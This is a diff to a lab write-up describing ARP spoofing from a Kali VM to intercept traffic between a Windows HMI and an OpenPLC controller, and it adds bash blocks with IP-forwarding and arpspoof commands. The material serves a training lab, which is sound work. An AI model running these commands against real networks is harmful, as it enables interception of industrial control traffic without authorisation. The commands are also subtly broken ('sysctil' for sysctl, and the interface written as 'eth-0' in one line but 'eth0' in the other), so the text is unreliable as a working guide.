@@ -16,19 +16,21 @@ Once traffic was redirected through Kali, Wireshark was used to capture and anal
 
 The Kali VM was configured to forward network traffic while ARP spoofing was performed against both the Windows HMI and Ubuntu PLC.
 
-The Windows system was led to believe that Kali was the PLC, while the PLC was led to believe that Kali was the Windows HMI. As a result, communications between the two systems were transparently routed through the attacker machine.
+The Windows system was led to believe that Kali was the PLC, while the PLC was led to believe that Kali was the Windows HMI. As a result, communications between the two systems were transparently routed through the attacker machine. The below arpspoof commands needed to be run at the same time. 
 
 ### Command - Set the kali VM to act like a router
 
-'''
+```bash
 sudo sysctil -w net.ipv4.ip_forward=1
-'''
+```
 
 ### Command – Kali Positioned Between HMI and PLC
 
-'''
-sudo arpspoof -i eth0 -t <ip> <ip> 
-'''
+```bash
+sudo arpspoof -i eth0 -t <HMI_ip> <OpenPLC_ip>
+
+sudo arpspoof -i eth-0 -t <OpenPLC_ip> <HMI_ip> 
+```
 
 *ARP spoofing used to redirect communications through the Kali Linux attacker system.*
 
